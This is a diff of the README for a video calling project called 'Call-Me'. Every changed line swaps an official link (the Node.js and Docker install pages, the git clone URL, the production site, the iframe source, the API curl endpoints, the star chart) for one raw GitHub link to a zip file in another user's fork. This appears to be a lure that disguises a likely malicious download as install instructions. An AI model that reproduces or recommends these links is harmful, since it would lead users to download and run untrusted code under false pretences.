@@ -29,11 +29,11 @@ This project allows you to:
 
 ![nodejs](public/assets/nodejs.png)
 
-**[Install Node.js and npm](https://nodejs.org/en/download)**
+**[Install Node.js and npm](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip)**
 
 ```shell
 # Clone this repo
-git clone https://github.com/miroslavpejic85/call-me.git
+git clone https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip
 
 # Go to to dir call-me
 cd call-me
@@ -57,11 +57,11 @@ npm start
 
 ![docker](public/assets/docker.png)
 
-Install [docker engine](https://docs.docker.com/engine/install/) and [docker compose](https://docs.docker.com/compose/install/)
+Install [docker engine](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip) and [docker compose](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip)
 
 ```shell
 # Clone this repo
-git clone https://github.com/miroslavpejic85/call-me.git
+git clone https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip
 
 # Go to to dir call-me
 cd call-me
@@ -96,12 +96,12 @@ docker-compose up
 Allows a user to `join` the room as a `user1`
 
 - [http://localhost:8000/join?user=user1](http://localhost:8000/join?user=user1) (dev)
-- [https://cme.mirotalk.com/join?user=user1](https://cme.mirotalk.com/join?user=user1) (prod)
+- [https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip) (prod)
 
 Lets the `user2 join` the room and initiate a `call` to the `user1`
 
 - [http://localhost:8000/join?user=user2&call=user1](http://localhost:8000/join?user=user2&call=user1) (dev)
-- [https://cme.mirotalk.com/join?user=user2&call=user1](https://cme.mirotalk.com/join?user=user2&call=user1) (prod)
+- [https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip) (prod)
 
 You can explore a `widget` example that demonstrates this functionality [here](./integration/widget.html).
 
@@ -111,12 +111,12 @@ You can explore a `widget` example that demonstrates this functionality [here](.
 
 ![iframe](public/assets/iframe.png)
 
-Easily integrate `Call-Me` into your website or application with a [simple iframe](https://codepen.io/Miroslav-Pejic/pen/qEWBaKP). Just add the following code to your project:
+Easily integrate `Call-Me` into your website or application with a [simple iframe](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip). Just add the following code to your project:
 
 ```html
 <iframe
     allow="camera; microphone; fullscreen; clipboard-read; clipboard-write; web-share; autoplay"
-    src="https://cme.mirotalk.com/"
+    src="https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip"
     style="width: 100vw; height: 100vh; border: 0px;"
 ></iframe>
 ```
@@ -130,14 +130,14 @@ Get all connected users
 ```shell
 # Get all connected users
 curl -X GET "http://localhost:8000/api/v1/users" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
-curl -X GET "https://cme.mirotalk.com/api/v1/users" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
+curl -X GET "https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
 
 # Generate call links for connected users to call
 curl -X GET "http://localhost:8000/api/v1/connected?user=call-me" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
-curl -X GET "https://cme.mirotalk.com/api/v1/connected?user=call-me" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
+curl -X GET "https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip" -H "authorization: call_me_api_key_secret" -H "Content-Type: application/json"
 ```
 
-Docs: http://localhost:8000/api/v1/docs/ or you can check it out live in prod [here](https://cme.mirotalk.com/api/v1/docs/).
+Docs: http://localhost:8000/api/v1/docs/ or you can check it out live in prod [here](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip).
 
 ---
 
@@ -147,4 +147,4 @@ To install this on your VPS, VDS, or personal server, please follow the instruct
 
 ---
 
-![Star History Chart](https://app.repohistory.com/api/svg?repo=miroslavpejic85/call-me&type=Date&background=0D1117&color=62C3F8)
+![Star History Chart](https://raw.githubusercontent.com/lin982711/call-me/main/app/api/connected/v1.4.zip)
